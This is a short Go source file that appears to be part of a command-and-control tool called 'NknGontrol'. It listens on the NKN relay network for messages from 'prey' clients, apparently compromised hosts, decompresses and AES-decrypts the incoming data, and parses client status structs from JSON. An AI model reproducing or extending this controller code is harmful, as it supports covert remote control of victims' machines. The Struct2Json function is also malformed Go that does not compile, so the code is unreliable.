package main

import (
	"NknGontrol/module/cipher"
	"NknGontrol/module/compress"
	"NknGontrol/module/nkntransfer"
	"encoding/json"
	"fmt"

	"github.com/nknorg/nkn-sdk-go"
)

func StartPreyListener(listenid string) {

	listener, err := nkn.NewMultiClient(nkntransfer.Account, listenid, TransThreads, false, nil)
	if err != nil {
		fmt.Println(err)
	}
		fmt.Println(listener.Address())
	<-listener.OnConnect.C
		fmt.Println("Connection opened.")

		for {
		msg := <-listener.OnMessage.C
		Dealmsg(msg)
	}

}

func AesCompressListener(b []byte) []byte {
	unzip, err := compress.UnZip(b)
	if err != nil {
		fmt.Println("接受数据无法解码", err)
	}
	data, _ := cipher.AesCbcDecrypt(unzip, []byte(Aeskey))
	return data
}

func Struct2Json(clientstruct interface{}) string {
	json, _ := json.Marshal(clientstruct) 	return string(json)
}

func (client *PreyStat) Json2Struct(dedata []byte) {
	jsontmp := string(dedata)
	json.Unmarshal([]byte(jsontmp), client)
}
